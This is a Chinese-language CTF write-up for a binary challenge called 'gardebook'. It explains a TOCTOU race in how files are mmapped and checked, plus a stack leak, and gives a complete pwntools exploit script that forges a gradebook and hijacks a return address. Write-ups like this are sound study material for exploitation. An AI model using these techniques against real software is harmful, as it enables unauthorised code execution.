# gardebook

> 	挺有趣的一道题，不过逆向也有点繁琐。

## Analysis

首先可以 patch 掉输出中的 usleep 便于本地调试。

这道题拿到 ida 中顺着逻辑往下看就可以看到最初程序要求读入 STUDENT FILE 文件，并将其存到 tmp 目录下，使用 mmap 把文件内容映射到了固定的地址上。这一系列操作中就存在 TOCTOU( Time of Check to Time of Use ) 的问题：

```c
case 1:
  if (check_name(file)) {
    printf_("INVALID NAME\n");
  } else {
    fd = open(file, 2);
    if (fd >= 0) {
      if (fstat(fd, &buf) >= 0) {
        len = buf.st_size;
        addr = mmap((void *)0x4752ADE50000LL, buf.st_size, 3, 1, fd, 0LL);
        if (addr == (void *)0x4752ADE50000LL) {
          if (len < *((_QWORD *)addr + 9) ||
              *((_QWORD *)addr + 9) < *((_QWORD *)addr + 11) ||
              *((_QWORD *)addr + 11) <= 0x5FuLL) {
            puts("GRADEBOOK CORRUPTED");
            sub_16A8();
          }
        } else {
          sub_16A8();
          printf_("ERROR\n");
        }
      } else {
        close(fd);
        printf_("ERROR\n");
      }
    } else {
      printf_("ERROR\n");
    }
  }
  break;
case 2:
  if (check_name(file)) {
    printf_("FILE NOT FOUND. GENERATING RANDOM NAME.\n");
    strcpy(file, src);
    getrandom(v3, 16LL, 0LL);
    for (i = 0; i <= 15; ++i) {
      file[2 * i + 12] = a0123456789abcd[(unsigned __int8)v3[i] >> 4];
      file[2 * i + 13] = a0123456789abcd[v3[i] & 0xF];
    }
    BYTE4(v9) = 0;
    printf_("GENERATED FILENAME: ");
    printf_((unsigned __int8 *)file);
    printf_("\n");
  }
  sub_14A2(file);
  break;
```

上面代码中，选项1先将文件映射到固定内存地址上，再对其进行合法性检查；选项2则可以向指定文件中写入数据，而这里对文件的处理方式很特别：将文件打开后转换为结构体再进行 mmap 映射。因此可以考虑先打开一个正常的 gradebook 并记录文件名，再开启一个连接把恶意构造的 fakebook 传到同个文件下。这个 fakebook 虽然无法通过检查，但是在 open 后可以通过 mmap 来覆盖掉之前的文件，再回到先前的连接中实现利用。

现在我们已经获得了任意上传 fakebook 的能力，接下来就是逆向分析程序对 gradebook 的处理及相关结构体：

```c
typedef struct {
  char magic[4]; 				// 0
  int year; 					// 4
  char name[32]; 				// 8
  char surname[32]; 			// 0x28
  size_t gradebook_size; 		// 0x48
  size_t grade_head_offset; 	// 0x50
  size_t empty_space_offset; 	// 0x58
} gradebook;

typedef struct {
  char cl[8];
  char course[22];
  char grade[2];
  char teacher[12];
  char room[4];
  size_t period;
  size_t next_offset;
} entry;
```

其中 gradebook 作为索引信息，0x50 之后紧跟着 entry 条目信息：

```c
entry_ptr = (char *)addr + 0x50;
```

而这个 gradebook 又是我们可以自己任意构造并传给程序，在 TOCTOU 的利用下，只用考虑绕过如下检查：

```c
if ( *(_QWORD *)entry_ptr >= *((_QWORD *)addr + 9)
      || *((_QWORD *)addr + 9) < (unsigned __int64)(*(_QWORD *)entry_ptr + 64LL) )
```

这两项检查都要求 gradebook.gradebook_size 比其它数据大，因此我们在伪造 expbook 的时候直接将 size 传入 2<<63 - 1 即可。

同时程序中还有一个 \0 截断的漏洞，可以泄露栈地址。

---

## Exploitation

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = "error"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 1
filename = "./chal"
if LOCAL:
    # io = process(filename)
    p1 = process(filename)
else:
    remote_service = ""
    remote_service = remote_service.strip().split(":")
    p1 = remote(remote_service[0], int(remote_service[1]))
elf = ELF(filename, checksec=False)
libc = ELF(elf.libc.path, checksec=False)

rl = lambda p, a=False: p.recvline(a)
ru = lambda p, a, b=True: p.recvuntil(a, b)
rn = lambda p, x: p.recvn(x)
s = lambda p, x: p.send(x)
sl = lambda p, x: p.sendline(x)
sa = lambda p, a, b: p.sendafter(a, b)
sla = lambda p, a, b: p.sendlineafter(a, b)
ia = lambda p: p.interactive()
dbg = lambda p, text=None: gdb.attach(p, text)
lg = lambda s: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def login(p):
    ru(p, b"PLEASE LOGON WITH USER PASSWORD:\n")
    sl(p, b"pencil")


def cmd(p, choice):
    ru(p, b"QUIT")
    sl(p, i2b(choice))


def open_stu_file(p, filename):
    cmd(p, 1)
    ru(p, b"ENTER FILENAME:")
    sl(p, filename)


def upload_stu_file(p, filename = b"x", data = b"", size=0):
    cmd(p, 2)
    ru(p, b"ENTER FILENAME:")
    sl(p, filename)
    if filename == b"x":
        ru(p, b"GENERATED FILENAME: ")
        temp_filename = ru(p, b"\n", "drop")
    else:
        temp_filename = filename
    ru(p, b"ENTER FILE SIZE:")
    if size == 0:
        size = len(data)
    sl(p, i2b(size))
    ru(p, b"SEND BINARY FILE DATA:")
    s(p, data)
    return temp_filename


def add_garde(p, class_, title, grade, teacher, room, period):
    cmd(p, 1)
    sla(p, b":", class_)
    sla(p, b":", title)
    sla(p, b":", grade)
    sla(p, b":", teacher)
    sla(p, b":", room)
    sla(p, b":", i2b(period))


def update_grade(p, idx, grade):
    cmd(p, 2)
    sla(p, b"WHICH GRADE:", i2b(idx))
    sla(p, b"NEW GRADE:", grade)


addr = 0x4752ade50000
def construct_gradebook(booksize = 0, offset = 0x60, data3 = 0):
    payload = b"GR\xad\xe5"  # magic
    payload += p32(2077)
    payload += b"eastXueLian".ljust(0x20, b"\x00")
    payload += b"LIANLIANGONGZHU".ljust(0x20, b"\x00")
    payload += p64(booksize)
    payload += p64(offset)
    payload += p64(data3)

    if booksize:
        payload += b"LianCL".ljust(8, b"\x00")
        payload += b"COURSE".ljust(22, b"\x00")
        payload += b"A+".ljust(2, b"\x00")
        payload += b"aaaa".ljust(12, b"\x00")
        payload += b"NAIL".ljust(4, b"\x00")
        payload += p64(0)
        payload += p64(data3)
    else:
        payload += b"".ljust(8, b"\x00")
        payload += b"COURSE".ljust(22, b"\x00")
        payload += b"A+".ljust(2, b"\x00")
        payload += b"aaaa".ljust(12, b"\x00")
        payload += b"NAIL".ljust(4, b"\x00")
        payload += p64(0)
        payload += p64(0)

    if booksize == 0:
        booksize = len(payload)
        payload = payload[:0x48] + p64(booksize) + payload[0x50:]
        payload = payload[:0x58] + p64(booksize) + payload[0x60:]
    return payload

process_ = 0
def debugPID(p):
    global process_
    process_ = p
    lg("process_.pid")
    input()

# gradebook_data = open("./gradebook", "rb").read()
gradebook_data = construct_gradebook()
login(p1)

debugPID(p1)

victim = upload_stu_file(p1, b"x", gradebook_data, len(gradebook_data))
open_stu_file(p1, victim)

# Leak stack base first.
ru(p1, b"NAIL     ")
ret_addr = u64_ex(ru(p1, b"\n", "drop")) + 0x38
lg("ret_addr")

# process TOCTOU attack
expbook_data = construct_gradebook(((2<<63) - 1), 0x60, ret_addr - addr)
p2 = process(filename)
login(p2)
upload_stu_file(p2, victim, expbook_data, len(expbook_data))
open_stu_file(p2, victim)
p2.close()

cmd(p1, 4)
ru(p1, b"NAIL")
ru(p1, b"NAIL")
ru(p1, b"\n")
elf_base = u64_ex(ru(p1, b"pencil", "drop").replace(b" ", b"")) - 0x2386
gift_addr = elf_base + 0x16E4
lg("elf_base")

add_garde(p1, p64(gift_addr), b"a", b"a", b"a", b"a", 1)

ia(p1)
```

---

> 感觉主要还是逆向分析结构体+调试
